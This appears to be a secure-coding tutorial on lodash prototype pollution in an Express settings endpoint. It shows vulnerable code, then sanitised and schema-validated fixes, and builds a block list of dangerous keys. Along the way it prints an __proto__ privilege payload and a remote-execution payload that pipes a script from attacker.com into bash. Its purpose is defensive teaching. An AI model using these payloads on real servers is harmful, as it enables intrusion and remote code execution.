This is extremely dangerous! Lodash versions before 4.17.19 are vulnerable to prototype pollution, which can lead to remote code execution.

**VULNERABLE CODE**:

```javascript
const express = require('express');
const _ = require('lodash'); // version < 4.17.19

const app = express();
app.use(express.json());

const defaultConfig = {
  theme: 'light',
  language: 'en',
  notifications: true
};

// DANGEROUS: Deep merge with untrusted user input
app.post('/api/settings', (req, res) => {
  const userSettings = req.body;

  // This allows prototype pollution!
  const mergedConfig = _.merge({}, defaultConfig, userSettings);

  // Later in the application
  const user = {};
  if (user.isAdmin) { // Polluted prototype makes this true!
    grantAdminAccess();
  }

  res.json({ config: mergedConfig });
});

app.listen(3000);
```

**Attack Payload**:
```json
{
  "__proto__": {
    "isAdmin": true
  }
}
```

**Alternative RCE Payload**:
```json
{
  "constructor": {
    "prototype": {
      "outputFunctionName": "x;process.mainModule.require('child_process').execSync('curl https://attacker.com/shell.sh | bash');x"
    }
  }
}
```

**Why This Is Dangerous**:
- `_.merge()` recursively copies properties including `__proto__` and `constructor`
- Polluting Object.prototype affects ALL objects in the application
- Can bypass authentication, authorization, and lead to RCE via template engines
- The vulnerability persists for the lifetime of the Node.js process

**SECURE VERSION**:

```javascript
const express = require('express');
const _ = require('lodash'); // version >= 4.17.21

const app = express();
app.use(express.json());

const defaultConfig = {
  theme: 'light',
  language: 'en',
  notifications: true
};

// Allowed configuration keys (whitelist)
const ALLOWED_SETTINGS = ['theme', 'language', 'notifications', 'fontSize'];
const ALLOWED_THEMES = ['light', 'dark', 'system'];
const ALLOWED_LANGUAGES = ['en', 'es', 'fr', 'de', 'ja'];

// Sanitize input to prevent prototype pollution
function sanitizeObject(obj, allowedKeys) {
  if (typeof obj !== 'object' || obj === null) {
    return {};
  }

  const sanitized = {};
  for (const key of allowedKeys) {
    if (Object.prototype.hasOwnProperty.call(obj, key)) {
      // Block prototype pollution vectors
      if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
        continue;
      }
      sanitized[key] = obj[key];
    }
  }
  return sanitized;
}

// Validate setting values
function validateSettings(settings) {
  const validated = {};

  if (settings.theme && ALLOWED_THEMES.includes(settings.theme)) {
    validated.theme = settings.theme;
  }
  if (settings.language && ALLOWED_LANGUAGES.includes(settings.language)) {
    validated.language = settings.language;
  }
  if (typeof settings.notifications === 'boolean') {
    validated.notifications = settings.notifications;
  }
  if (typeof settings.fontSize === 'number' && settings.fontSize >= 10 && settings.fontSize <= 24) {
    validated.fontSize = settings.fontSize;
  }

  return validated;
}

app.post('/api/settings', (req, res) => {
  // Step 1: Sanitize input (whitelist approach)
  const sanitized = sanitizeObject(req.body, ALLOWED_SETTINGS);

  // Step 2: Validate values
  const validatedSettings = validateSettings(sanitized);

  // Step 3: Safe merge with Object.assign (shallow, no recursion)
  const mergedConfig = Object.assign({}, defaultConfig, validatedSettings);

  res.json({ config: mergedConfig });
});

app.listen(3000);
```

**Key Security Controls**:
- **Whitelist approach**: Only allowed keys are processed, blocking `__proto__`, `constructor`, `prototype`
- **Input validation**: Each setting value is validated against allowed values/types
- **Safe merge**: Using `Object.assign()` for shallow copy instead of recursive `_.merge()`
- **Updated dependencies**: Always use lodash >= 4.17.21 which has built-in prototype pollution protection

Great questions! For nested configs, you need a recursive sanitizer with depth limits. For dependency security, you need automated scanning and lockfile management.

**PRODUCTION PATTERN**:

```javascript
const express = require('express');
const Ajv = require('ajv');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');

const app = express();
app.use(helmet());
app.use(express.json({ limit: '10kb' })); // Limit payload size

// JSON Schema for configuration validation
const configSchema = {
  type: 'object',
  additionalProperties: false, // Reject unknown properties
  properties: {
    theme: { type: 'string', enum: ['light', 'dark', 'system'] },
    language: { type: 'string', pattern: '^[a-z]{2}(-[A-Z]{2})?$' },
    notifications: {
      type: 'object',
      additionalProperties: false,
      properties: {
        email: { type: 'boolean' },
        push: { type: 'boolean' },
        frequency: { type: 'string', enum: ['instant', 'daily', 'weekly'] }
      }
    },
    display: {
      type: 'object',
      additionalProperties: false,
      properties: {
        fontSize: { type: 'integer', minimum: 10, maximum: 24 },
        contrast: { type: 'string', enum: ['normal', 'high'] }
      }
    }
  }
};

const ajv = new Ajv({ allErrors: true });
const validateConfig = ajv.compile(configSchema);

// Frozen set of dangerous keys
const DANGEROUS_KEYS = Object.freeze(new Set([
  '__proto__',
  'constructor',
  'prototype',
  '__defineGetter__',
  '__defineSetter__',
  '__lookupGetter__',
  '__lookupSetter__'
]));

// Recursive sanitizer with depth limit
function deepSanitize(obj, maxDepth = 3, currentDepth = 0) {
  if (currentDepth > maxDepth) {
    throw new Error('Maximum nesting depth exceeded');
  }

  if (obj === null || typeof obj !== 'object') {
    return obj;
  }

  if (Array.isArray(obj)) {
    return obj.map(item => deepSanitize(item, maxDepth, currentDepth + 1));
  }

  const sanitized = Object.create(null); // No prototype!

  for (const [key, value] of Object.entries(obj)) {
    // Block dangerous keys
    if (DANGEROUS_KEYS.has(key)) {
      console.warn(`Blocked dangerous key: ${key}`);
      continue;
    }

    // Validate key format
    if (!/^[a-zA-Z][a-zA-Z0-9_]*$/.test(key)) {
      console.warn(`Blocked invalid key format: ${key}`);
      continue;
    }

    sanitized[key] = deepSanitize(value, maxDepth, currentDepth + 1);
  }

  return sanitized;
}

// Safe deep merge (no prototype chain traversal)
function safeMerge(target, source) {
  const result = Object.create(null);

  // Copy target properties
  for (const [key, value] of Object.entries(target)) {
    result[key] = value;
  }

  // Merge source properties
  for (const [key, value] of Object.entries(source)) {
    if (typeof value === 'object' && value !== null && !Array.isArray(value)) {
      result[key] = safeMerge(result[key] || Object.create(null), value);
    } else {
      result[key] = value;
    }
  }

  return result;
}

const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100
});

const defaultConfig = Object.freeze({
  theme: 'light',
  language: 'en',
  notifications: Object.freeze({
    email: true,
    push: false,
    frequency: 'daily'
  }),
  display: Object.freeze({
    fontSize: 14,
    contrast: 'normal'
  })
});

app.post('/api/settings', limiter, (req, res) => {
  try {
    // Step 1: Deep sanitize to block prototype pollution
    const sanitized = deepSanitize(req.body);

    // Step 2: Validate against JSON schema
    const isValid = validateConfig(sanitized);
    if (!isValid) {
      console.warn('Invalid config:', validateConfig.errors);
      return res.status(400).json({ 
        error: 'Invalid configuration',
        details: validateConfig.errors.map(e => e.message)
      });
    }

    // Step 3: Safe merge with defaults
    const mergedConfig = safeMerge(defaultConfig, sanitized);

    // Step 4: Audit log
    console.log(JSON.stringify({
      event: 'config_update',
      userId: req.user?.id,
      ip: req.ip,
      timestamp: new Date().toISOString(),
      changes: Object.keys(sanitized)
    }));

    res.json({ config: mergedConfig });

  } catch (error) {
    console.error('Config update error:', error.message);
    res.status(400).json({ error: 'Invalid request' });
  }
});

app.listen(3000);
```

